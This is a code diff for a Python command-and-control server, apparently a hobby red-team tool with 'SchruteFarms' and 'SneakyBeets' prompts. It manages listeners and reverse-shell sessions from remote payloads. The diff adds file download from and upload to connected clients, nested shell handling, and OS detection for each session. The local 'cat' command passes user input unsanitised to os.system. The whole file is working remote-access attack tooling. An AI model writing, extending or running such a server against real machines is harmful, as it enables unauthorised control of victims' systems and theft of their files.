@@ -24,27 +24,29 @@ sessions = []
 listeners = []
 
 class listenerClass:
-	listening_port = 1234
-	listener_id = 0
+	listening_port = 1234	#define the port for a listener (so no other listeners are started)
+	listener_id = 0	#to id the listener
 	listenerIdCount = 0	#this will hold next available listenerID
 
 class sessionClass:
-	socket = 0
-	session_id = 0
-	local_port = 0
-	remote_port = 0
-	remote_ip = 0
-	remote_user = "UNKNOWN"
-	sessionIdCount = 0	#this will hold next available sessionID
+	socket = 0	#to hold the connection socket for writing and reading
+	session_id = 0 #to id the session
+	local_port = 0 #just for used port sake
+	remote_port = 0	#for cool looks
+	remote_ip = 0 #for cool looks
+	remote_user = "UNKNOWN" #whoami is run instantly so the user can recognize perms
+	shell_count = 0 #for id'ing
+	sessionIdCount = 0	#this will hold next available 
+	session_type = "UNKNOWN"
 
 
 def main():
 	while 1:
 		command = getCommand()
 
-		#commands = command.trim()
 		commands = command.split(" ")
 
+		#if the user wants to start a new listener
 		if commands[0] == "listener":
 			if len(commands) > 1:
 				try:
@@ -52,7 +54,7 @@ def main():
 				except:
 					print("Integer required")
 					continue
-
+				#start a listener thread if proper int is given
 				thread = threading.Thread(target=listener, args=(lisPort,))
 				thread.daemon = True
 				thread.start()
@@ -60,9 +62,13 @@ def main():
 			else:
 				print("Usage: listener <port>")
 		
+		#this is a simple listener case for testing (listening on port 1234)
 		elif commands[0] == "default":
-			listener(PORT)
+			thread = threading.Thread(target=listener, args=(1234,))
+			thread.daemon = True
+			thread.start()
 
+		#if the user wants to display the current listeners
 		elif commands[0] == "listeners":
 			#this code will be implemented at a later time when listeners are multithreaded
 			print("Listeners:\n")
@@ -70,13 +76,15 @@ def main():
 				print("Listener ID: " + str(lis.listener_id) + "   Listening Port: " + str(lis.listening_port))
 			print("")
 
+		#if the user wants to display the current sessions
 		elif commands[0] == "sessions":
 			#this code will be implemented at a later time when sessions are multithreaded
 			print("Sessions:\n")
 			for sesh in sessions:
-				print("Session ID: " + str(sesh.session_id) + "  Remote IP: " + str(sesh.remote_ip) + "   Remote User: " + str(sesh.remote_user))
+				print("Session ID: " + str(sesh.session_id) + "  Remote IP: " + str(sesh.remote_ip) + "   Remote User: " + sesh.remote_user[:-1] + "   Session Type: " + sesh.session_type)
 			print("")
 
+		#if the user wants to interact with a given session by session id
 		elif commands[0] == "session" or commands[0] == "interact":
 			try:
 				sid = int(commands[1])
@@ -85,6 +93,7 @@ def main():
 				continue
 			interact(sid)
 
+		#if the user wants to kill a current session by session id
 		elif commands[0] == "kill":
 			try:
 				sid = int(commands[1])
@@ -94,36 +103,56 @@ def main():
 			sesh = getSession(sid)
 			if sesh:
 				kill(sesh)
+				sessions.remove(sesh)
+			else:
+				print("Session not found")
 
-
-		elif commands[0] == "help": #this will open the help menu txt file and print it out
+		#this will open the help menu txt file and print it out
+		elif commands[0] == "help":
 			f = open("help.txt", 'r')
 			menu = f.read()
 			print('\n' + menu +'\n')
 			f.close() #close the open file
 
+		#LOCAL COMMAND EXECUTION
+
+		#on local directory listing
+		elif commands[0] == "lls" or commands[0] == "ls":
+			os.system('ls')
+
+		#on local file cat
+		elif commands[0] == "cat":
+			if len(commands) > 1:
+				os.system('cat ' + commands[1])
+			else:
+				print("Usage: cat <filename>")
+
+		#on clear command
 		elif commands[0] == "clear":
 			os.system('clear')
 
-		
+		#on exit we have to be sure to close all existing connections
 		elif commands[0] == "exit":
 			for sesh in sessions:
 				kill(sesh)
 			print("Exiting...")
 			return
+
+		#if the input isn't recognized
 		else:
 			print("Bad Input.")
 
 
+#Defined helping functions:
 
 
 def getCommand():
+	#read input until something is given and then return the command
 	c = ""
 	while not c:
 	   c = input("SchruteFarms> ")
 
 	return c
-
 
 
 def interact(sid):
@@ -139,17 +168,61 @@ def interact(sid):
 	while cont:
 		#now we can pass commands to the payload for execution
 		data = "filler"
-		command = input("SneakyBeets " + str(curr.session_id) + "-> ")
+		if curr.shell_count == 0:
+			command = input("SneakyBeets " + str(curr.session_id) + "-> ")
+		else:
+			command = input()
 
-		if command == "bg" or command == "background":
+		comParts = command.split(" ")
+		#special command cases:
+
+		if not command:
+			continue
+		#for backgrounding a session
+		elif command == "bg" or command == "background":
 			return
 
-		command += '\n'
-
-		if command == '\n':
+		#download files
+		elif comParts[0] == "download":
+			if len(comParts) > 1:
+				download(curr, comParts[1])
+			else:
+				download(curr, "")
+			continue
+		#upload files
+		elif comParts[0] == "upload":
+			if len(comParts) > 1:
+				upload(curr, comParts[1])
+			else:
+				upload(curr, "")
 			continue
 
-		curr.socket.sendall(command.encode())
+		#on local directory listing
+		elif command == "lls":
+			os.system('ls')
+			continue
+		#on local file cat
+		elif comParts[0] == "lcat":
+			if len(comParts) > 1:
+				os.system('cat ' + comParts[1])
+			else:
+				print("Usage: cat <filename>")
+			continue
+
+
+		#for handling shell cases
+		elif command == "shell" or command == "shell2" or command == "ushell" or command == "zshell":
+			curr.shell_count = curr.shell_count + 1 #one layer deeper
+		elif command == "exit":
+			curr.shell_count = curr.shell_count - 1 #back one layer
+
+		command += '\n' #this is for socket purposes (handling in netcat and such)
+
+		try:
+			curr.socket.sendall(command.encode())
+		except:
+			print("Socket write failed")
+			return
 
 		sleep(0.1) #stupid thing to make sure socket is ready to fully read
 
@@ -157,23 +230,31 @@ def interact(sid):
 		print(data.decode())
 
 		#leave conditions
-		if command == "exit\n":
+		if command == "exit\n" and curr.shell_count == -1:
 			cont = 0
 			kill(curr)
-		if not data: #if read nothing
+			sessions.remove(curr)
+		if not data: #if read nothing (for nonblocking later)
 			cont = 0
 
-def kill(sesh):
-	command = "exit\n"
-	sesh.socket.sendall(command.encode())
-	data = sesh.socket.recv(2048)
 
-	print("Session: " + str(sesh.session_id) + " closed")
-	sesh.socket.close()
-	sessions.remove(sesh)
+def kill(sesh):
+	#to kill the connection of a session (not removing from sessions list)
+	command = "exit\n"
+	#send exit to stop client payload
+	try:
+		sesh.socket.sendall(command.encode())
+		#receive final response
+		data = sesh.socket.recv(2048)
+		print("Session: " + str(sesh.session_id) + " closed")
+		sesh.socket.close()
+
+	except:
+		print("Session already dead")
 
 
 def getSession(sid):
+	#return session by session id
 	for sesh in sessions:
 		if sesh.session_id == sid:
 			return sesh
@@ -181,8 +262,9 @@ def getSession(sid):
 	return 0
 
 
-
 def listener(port):
+	#instantiate a listener on the port passed
+	#check if port is in legit range
 	if port < 1024 or port > 65535:
 		print("INVALID PORT")
 		return
@@ -218,8 +300,10 @@ def listener(port):
 
 		newsesh = sessionClass()
 		newsesh.socket = conn
+		if "linux" in data.decode():
+			newsesh.session_type = "linux"
 
-		#give the session the next availabl id
+		#give the session the next available id
 		newsesh.session_id = sessionClass.sessionIdCount
 		sessionClass.sessionIdCount += 1
 
@@ -234,8 +318,41 @@ def listener(port):
 
 		sessions.append(newsesh)
 
-		return			
 
+#download and upload functionality:
+def download(sesh, fileName):
+	#download a file from the client
+	command = "download\n"
+	sesh. socket.sendall(command.encode())
+	data = sesh.socket.recv(2048)
+	if data:
+		if not fileName:
+			fileName = input("File name: ")
+		sesh.socket.sendall(fileName.encode())
+		fileData = sesh.socket.recv(8192)
+		newFile = open(fileName, "w")
+		newFile.write(fileData.decode())
+		newFile.close()
+	else:
+		print("Failed to receive reply")
+
+def upload(sesh, fileName):
+	#upload a file to the client
+	if not fileName:
+		fileName = input("File name: ")
+
+	command = "upload\n"
+	sesh.socket.sendall(command.encode())
+	data = sesh.socket.recv(2048)
+	if data:
+		sesh.socket.sendall(fileName.encode())
+		response = sesh.socket.recv(1024)
+		uploadFile = open(fileName, "r")
+		fileData = uploadFile.read()
+		sesh.socket.sendall(fileData.encode())
+		uploadFile.close()
+	else:
+		print("Failed to receive reply")
 
 
 
